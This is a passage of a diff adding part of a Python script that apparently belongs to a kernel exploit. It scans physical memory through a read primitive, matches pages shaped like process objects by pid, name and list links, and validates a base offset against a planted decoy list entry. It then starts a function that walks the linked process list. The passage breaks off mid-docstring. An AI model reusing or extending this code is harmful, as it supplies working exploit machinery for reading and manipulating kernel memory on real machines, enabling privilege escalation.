@@ -1,0 +1,82 @@
+﻿ 155|    pa_max = page - lo
+ 156|    log("window B=%#x..%#x  pa_max=%#x  %d pages  dry=%d"
+ 157|        % (lo, page, pa_max, (page - lo) // 0x1000, dry))
+ 158|    plan = [(a, min(b, pa_max)) for a, b in ranges if a < pa_max]
+ 159|    t0 = time.perf_counter()
+ 160|    tried = shapes = wins = 0
+ 161|    for rlo, rhi in plan:
+ 162|        rt = time.perf_counter()
+ 163|        pa = rlo
+ 164|        while pa < rhi:
+ 165|            if start is not None and pa < start:
+ 166|                pa += WIN
+ 167|                continue
+ 168|            n = min(WIN, rhi - pa)
+ 169|            wins += 1
+ 170|            if wins % 64 == 0:
+ 171|                prog("CKPT next=%#x tried=%d shapes=%d %.0fs"
+ 172|                     % (pa + n, tried, shapes, time.perf_counter() - t0))
+ 173|                if wins % 256 == 0:
+ 174|                    log("  ... pa=%#x tried=%d shapes=%d %.1fs"
+ 175|                        % (pa, tried, shapes, time.perf_counter() - t0))
+ 176|            if budget and time.perf_counter() - t0 > budget:
+ 177|                prog("BUDGET next=%#x tried=%d shapes=%d" % (pa, tried, shapes))
+ 178|                log("budget %.1fs, stop at pa=%#x" % (time.perf_counter() - t0, pa))
+ 179|                return None, pa, "budget"
+ 180|            try:
+ 181|                buf = g.read_phys(pa, n)
+ 182|            except OSError:
+ 183|                prog("FAULT pa=%#x n=%#x" % (pa, n))
+ 184|                buf = None
+ 185|            if buf is None:
+ 186|                pages = []
+ 187|                for k in range(0, n, 0x1000):
+ 188|                    try:
+ 189|                        pages.append((pa + k, g.read_phys(pa + k, 0x1000)))
+ 190|                    except OSError:
+ 191|                        prog("BADPAGE pa=%#x" % (pa + k))
+ 192|            else:
+ 193|                pages = [(pa + k, buf[k:k + 0x1000]) for k in range(0, n, 0x1000)]
+ 194|            for ppa, p in pages:
+ 195|                tried += 1
+ 196|                if len(p) < 0x400:                  # short/torn page read
+ 197|                    continue
+ 198|                s = shape(p)
+ 199|                if not s:
+ 200|                    continue
+ 201|                shapes += 1
+ 202|                b = page - ppa
+ 203|                log("shape B=%#x pa=%#x pid=%#x name=%r"
+ 204|                    % (b, ppa, s[0], p[OBJ_NAME:OBJ_NAME + 15]))
+ 205|                r = decoy_read(g, b, LINK)
+ 206|                if not r:
+ 207|                    log("  reciprocity failed")
+ 208|                elif r[0] == NODE_FL and r[1] == NODE_BL:
+ 209|                    log("  ACCEPT B=%#x decoy flink=%#x blink=%#x" % (b, r[0], r[1]))
+ 210|                    prog("ACCEPT b=%#x shapes=%d" % (b, shapes))
+ 211|                    log("  tried=%d shapes=%d %.1fs"
+ 212|                        % (tried, shapes, time.perf_counter() - t0))
+ 213|                    return b, None, "ok"
+ 214|                else:
+ 215|                    log("  WARN decoy pair %#x/%#x != %#x/%#x"
+ 216|                        % (r[0], r[1], NODE_FL, NODE_BL))
+ 217|                    if r[0] != NODE_FL and r[1] != NODE_BL:
+ 218|                        log("  neither half matches, rejected")
+ 219|                if dry and shapes >= dry:
+ 220|                    log("dry: %d shapes, stopping" % shapes)
+ 221|                    prog("DRY stop at pa=%#x shapes=%d" % (ppa, shapes))
+ 222|                    return None, ppa, "dry"
+ 223|            pa += n
+ 224|        log("range %#x..%#x done %.1fs" % (rlo, rhi, time.perf_counter() - rt))
+ 225|    log("no candidate  tried=%d shapes=%d %.1fs"
+ 226|        % (tried, shapes, time.perf_counter() - t0))
+ 227|    return None, None, "none"
+ 228|
+ 229|
+ 230|def hop(g, b, va, seen):
+ 231|    """VA -> (pid, base_pa, fl, bl, name) for a list node, or None.
+ 232|
+ 233|    p44d: the node VA is base+0x258, so the object starts at pa-0x258 -- NOT the
+ 234|    -0x1d8 lane the decoy's fake LINK_ENTRY sits on.
+ 235|    """
+372
